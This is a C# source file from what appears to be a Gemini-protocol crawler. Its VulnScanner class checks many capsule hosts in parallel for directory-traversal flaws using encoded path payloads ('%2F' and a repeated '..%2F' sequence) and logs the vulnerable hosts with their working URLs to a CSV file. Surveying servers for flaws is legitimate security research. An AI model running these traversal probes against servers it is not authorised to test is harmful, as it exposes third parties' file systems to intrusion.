using System;
using System.IO;
using System.Threading.Tasks;
using Gemini.Net;
using Kennedy.Crawler.Utils;


namespace Kennedy.Crawler.Support
{
    public class VulnScanner
    {

        public static void DoIt()
        {

            ThreadSafeCounter counter = new ThreadSafeCounter();
            ThreadSafeCounter found = new ThreadSafeCounter();

            ThreadedFileWriter logOut = new ThreadedFileWriter($"{Crawler.DataDirectory}/all-vulns.csv", 1);

            string[] hosts = File.ReadAllLines($"{Crawler.DataDirectory}capsules-to-scan.txt");

            int total = hosts.Length;

            int parallelThreadsCount = 10;
            Console.WriteLine($"Starting...");
            Parallel.ForEach(hosts, new ParallelOptions { MaxDegreeOfParallelism = parallelThreadsCount }, host =>
            {
                int t = counter.Increment();

                bool variant1 = IsVuln1(host);
                bool variant2 = IsVuln2(host);

                if (variant1 || variant2)
                {

                    var line = $"{host},";
                    if(variant1)
                    {
                        line += $"\"gemini://{host}/%2F/\",";
                    } else
                    {
                        line += "-,";
                    }

                    if (variant2)
                    {
                        line += $"\"gemini://{host}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F/\",";
                    }
                    else
                    {
                        line += "-,";
                    }
                    found.Increment();
                    Console.WriteLine(line);
                    logOut.WriteLine(line);
                }
                Console.WriteLine($"{t}\t{total}\t{found.Count}");
            }); //close method invocation 
            logOut.Close();

            int xxx = 5;

        }

        private static bool IsVuln1(string host)
        {
            GeminiRequestor gemiRequestor = new GeminiRequestor();

            var fullUrl = $"gemini://{host}/%2F/";

            var resp = gemiRequestor.Request(fullUrl);
            if (gemiRequestor.LastException == null && resp.IsSuccess && resp.IsTextResponse && resp.BodyText.Contains("Directory Listing"))
            {
                return true;
            }
            return false;
        }

        private static bool IsVuln2(string host)
        {
            GeminiRequestor gemiRequestor = new GeminiRequestor();

            var fullUrl = $"gemini://{host}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F/";

            var resp = gemiRequestor.Request(fullUrl);
            if (gemiRequestor.LastException == null && resp.IsSuccess && resp.IsTextResponse && resp.BodyText.Contains("Directory Listing"))
            {
                return true;
            }
            return false;
        }

    }
}
